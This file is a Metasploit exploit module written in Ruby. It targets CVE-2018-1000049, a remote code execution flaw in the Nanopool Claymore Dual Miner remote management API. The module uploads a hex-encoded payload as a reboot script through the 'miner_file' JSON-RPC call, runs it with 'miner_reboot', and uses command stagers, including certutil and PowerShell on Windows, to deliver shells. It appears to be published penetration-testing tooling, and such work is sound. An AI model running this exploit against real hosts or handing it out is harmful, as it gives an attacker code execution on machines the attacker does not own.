##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core/exploit/powershell'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::Tcp
  include Msf::Exploit::CmdStager
  include Msf::Exploit::Powershell

  def initialize(info = {})
    super(update_info(info,
      'Name'            => 'Nanopool Claymore Dual Miner APIs RCE',
      'Description'     => %q{
        This module takes advantage of miner remote manager APIs to exploit an RCE vulnerability.
      },
      'Author'          =>
        [
          'reversebrain@snado', # Vulnerability reporter
          'phra@snado'          # Metasploit module
        ],
      'License'         => MSF_LICENSE,
      'References'      =>
        [
          ['URL', 'https://nvd.nist.gov/vuln/detail/CVE-2018-1000049'],
          ['CVE', '2018-1000049']
        ],
      'Platform'        => ['win', 'linux'],
      'Targets'         =>
        [
          [ 'Linux',
            {
              'Platform' => 'linux',
              'Arch' => ARCH_X64
            }
          ],
          [ 'Windows',
            {
              'Platform' => 'windows',
              'Arch' => ARCH_X64
            }
          ]
        ],
      'Payload' =>
        {
          'BadChars' => "\x00"
        },
      'DisclosureDate'  => 'Feb 09 2018',
      'DefaultTarget'   => 0))

    register_options(
      [
        OptAddress.new('RHOST', [ true, 'Set miner host', '127.0.0.1' ]),
        OptPort.new('RPORT', [ true, 'Set miner port', 3333 ])
      ])
    deregister_options('URIPATH', 'SSL', 'SSLCert', 'SRVPORT', 'SRVHOST')
  end

  def bin_to_hex(s)
    s.each_byte.map { |b| b.to_s(16) }.join
  end

  def hex_to_bin(s)
    s.scan(/../).map { |x| x.hex.chr }.join
  end

  def execute_command(cmd, opts = {})
    case target['Platform']
    when 'linux'
      cmd = bin_to_hex(cmd)
    when 'windows'
      cmd = bin_to_hex(cmd_psh_payload(payload.encoded, payload_instance.arch.first))
    end
    case target['Platform']
    when 'linux'
      upload = "{\"id\":0,\"jsonrpc\":\"2.0\",\"method\":\"miner_file\",\"params\":[\"reboot.bash\", \"#{cmd}\"]}"
    when 'windows'
      upload = "{\"id\":0,\"jsonrpc\":\"2.0\",\"method\":\"miner_file\",\"params\":[\"reboot.bat\", \"#{cmd}\"]}"
    end
    begin
      connect
      sock.put(upload)
      buf = sock.get_once || ''
    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
      print_error(e)
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    ensure
      disconnect
    end
    trigger_vulnerability
  end

  def trigger_vulnerability
    execute = '{"id":0,"jsonrpc":"2.0","method":"miner_reboot"}'
    begin
      connect
      sock.put(execute)
      buf = sock.get_once || ''
    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
      print_error(e)
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    ensure
      disconnect
    end
  end

  def exploit
    case target['Platform']
    when 'linux'
      execute_cmdstager
    when 'windows'
      execute_cmdstager(flavor: :certutil, linemax: 10000)
    end
  end

  def check
    data = '{"id":0,"jsonrpc":"2.0","method":"miner_getfile","params":["config.txt"]}'
    begin
      connect
      sock.put(data)
      buf = sock.get_once || ''
      tmp = StringIO.new
      tmp << buf
      tmp2 = tmp.string
      hex = ''
      case target['Platform']
      when 'linux'
        hex = tmp2.scan(/\w+/)[5]
      when 'windows'
        hex = tmp2.scan(/\w+/)[7]
      end
      if not hex
        return Exploit::CheckCode::Safe
      end
      str = hex_to_bin(hex)
      if str.include?('WARNING')
        return Exploit::CheckCode::Vulnerable
      else
	return Exploit::CheckCode::Detected
      end
    rescue Rex::AddressInUse, ::Errno::ETIMEDOUT, Rex::HostUnreachable, Rex::ConnectionTimeout, Rex::ConnectionRefused, ::Timeout::Error, ::EOFError => e
      print_error(e)
      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}")
    ensure
      disconnect
    end
  end
end
